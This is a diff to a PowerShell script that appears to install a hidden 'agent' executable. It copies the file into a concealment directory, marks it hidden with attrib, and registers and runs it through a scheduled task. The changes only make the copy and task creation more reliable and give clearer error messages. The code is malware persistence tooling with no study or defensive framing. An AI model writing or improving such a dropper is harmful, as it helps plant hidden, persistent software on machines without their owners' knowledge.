@@ -2,8 +2,12 @@ $ProgressPreference = 'Continue'
 $ErrorActionPreference = 'Stop'
 
 $agentPath = $env:AgentPath
-if (-not $agentPath -or -not (Test-Path $agentPath)) {
-    Write-Output "ERROR: AgentPath not set or file missing: '$agentPath'"
+if (-not $agentPath) {
+    Write-Output "ERROR: AgentPath environment variable not set."
+    exit 1
+}
+if (-not (Test-Path -LiteralPath $agentPath)) {
+    Write-Output "ERROR: Agent file not found at '$agentPath'"
     exit 1
 }
 
@@ -17,7 +21,16 @@ if (-not (Test-Path $hideDir)) {
 
 # --- 2. Copy agent directly (no ADS) ---
 $agentFile = "$hideDir\agent.exe"
-Copy-Item -Path $agentPath -Destination $agentFile -Force
+# Remove any existing file first to avoid permission issues
+if (Test-Path $agentFile) {
+    Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
+}
+Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force -ErrorAction Stop
+# Verify copy succeeded
+if (-not (Test-Path $agentFile)) {
+    Write-Output "ERROR: Failed to copy agent to $agentFile"
+    exit 1
+}
 attrib +h $agentFile
 Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
 
@@ -49,7 +62,7 @@ if ($LASTEXITCODE -eq 0) {
     schtasks /run /tn $taskName 2>$null
     Write-Output "✅ Agent launched immediately."
 } else {
-    Write-Output "❌ Task creation failed."
+    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
     exit 1
 }
 
